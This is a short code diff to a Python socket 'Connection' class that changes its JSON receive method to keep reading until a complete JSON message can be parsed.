@@ -20,8 +20,13 @@ class Connection:
         self.client_socket.send(json_data)
     
     def json_recieve(self):
-        json_data = self.client_socket.recv(1024).decode()
-        return json.loads(json_data)
+            json_data = ""
+            while True:
+                try:
+                    json_data = json_data + self.client_socket.recv(1024).decode()
+                    return json.loads(json_data)
+                except ValueError:
+                    continue
     
     def execute_command(self, command):
         if command.lower() == "exit":
